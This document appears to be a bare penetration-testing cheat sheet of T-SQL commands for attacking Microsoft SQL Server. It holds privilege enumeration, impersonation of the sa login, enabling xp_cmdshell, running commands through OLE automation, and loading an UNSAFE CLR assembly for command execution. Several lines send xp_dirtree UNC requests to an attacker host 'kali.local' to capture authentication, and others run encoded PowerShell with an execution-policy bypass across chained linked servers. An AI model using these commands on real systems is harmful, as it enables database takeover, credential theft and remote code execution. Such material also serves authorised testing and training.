Server = sqlServer,1433; Database = master; User Id=admin; Password=P@ssw0rd; Integrated Security = True;
SELECT SYSTEM_USER;
SELECT USER_NAME;
SELECT IS_SRVROLEMEMBER('public');
SELECT IS_SRVROLEMEMBER('sysadmin');
EXEC master..xp_dirtree \"\\\\kali.local\\\\upi\"
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
EXEC sp_linkedservers;
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell whoami"
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c "ping kali.local"';
use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE; CREATE ASSEMBLY myAssembly FROM 'c:\\tools\\cmdExec.dll' WITH PERMISSION_SET = UNSAFE; CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec]; EXEC cmdExec 'whoami';
use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE; CREATE ASSEMBLY my_assembly FROM 0x4D5A900..... WITH PERMISSION_SET = UNSAFE; CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec]; EXEC cmdExec 'whoami'; 
EXEC('cmd') AT [linkedServer];
EXEC ('EXEC master..xp_dirtree \"\\\\kali.local\\\\upi\";') AT [linkedServer]
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [linkedServer]; EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [linkedServer]; EXEC ('xp_cmdshell ''powershell -nop -ep bypass -enc encodedCmd'';') AT [linkedServer]
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [sqlServer]') AT [linkedServer]; EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [sqlServer}]') AT [linkedServer]; EXEC (' EXEC (''xp_cmdshell ''''powershell -nop -ep bypass -enc encodedCmd'''';'') AT sqlServer') AT linkedServer